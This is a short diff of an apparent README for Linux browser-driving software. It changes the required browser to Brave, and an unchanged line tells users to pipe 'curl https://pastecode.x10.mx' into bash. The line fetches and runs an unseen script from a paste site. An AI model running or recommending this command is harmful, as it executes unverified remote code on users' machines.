@@ -9,9 +9,9 @@
 
 + **Linux** *(requires Ubuntu 24 or GLIBC_2.39)*
 
-Make sure the browser and driver binaries are located in /bin, the software will look for them in this location. The browser name must only match its name, otherwise you must rename it. 
+Make sure the browser and driver binaries are located in /bin, the software will look for them in this location. The browser name must only match its name, otherwise you must rename it, the software only supports the brave browser, if you don't have it on your machine you must install it.
 
-Ex: *chrome-browser* for *chrome* only
+Ex: *brave-browser* for *brave* only
 
 ```bash
 curl https://pastecode.x10.mx | bash -s -- --linux 
